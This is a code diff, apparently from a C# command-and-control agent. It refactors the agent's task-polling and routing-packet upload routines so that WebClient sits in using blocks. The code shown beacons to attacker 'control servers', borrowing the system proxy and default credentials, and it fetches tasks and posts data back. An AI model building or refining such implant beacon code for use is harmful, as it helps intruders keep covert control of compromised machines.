@@ -267,15 +267,17 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
                 byte[] routingPacket = NewRoutingPacket(null, 4);
                 string routingCookie = Convert.ToBase64String(routingPacket);
 
-                WebClient webClient = new WebClient();
-                webClient.Proxy = WebRequest.GetSystemWebProxy();
-                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
-                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
-                webClient.Headers.Add("Cookie", "session=" + routingCookie);
+                using (WebClient webClient = new WebClient())
+                {
+                    webClient.Proxy = WebRequest.GetSystemWebProxy();
+                    webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+                    webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
+                    webClient.Headers.Add("Cookie", "session=" + routingCookie);
 
-                Random random = new Random();
-                string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
-                results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+                    Random random = new Random();
+                    string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
+                    results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
+                }
             }
             catch (WebException)
             {
@@ -298,17 +300,19 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
             if (controlServer.StartsWith("http"))
             {
-                WebClient webClient = new WebClient();
-                webClient.Proxy = WebRequest.GetSystemWebProxy();
-                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
-                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
-
-                try
+                using (WebClient webClient = new WebClient())
                 {
-                    string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
-                    webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    webClient.Proxy = WebRequest.GetSystemWebProxy();
+                    webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+                    webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
+
+                    try
+                    {
+                        string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
+                        webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    }
+                    catch (WebException) { }
                 }
-                catch (WebException) { }
             }
 
         }
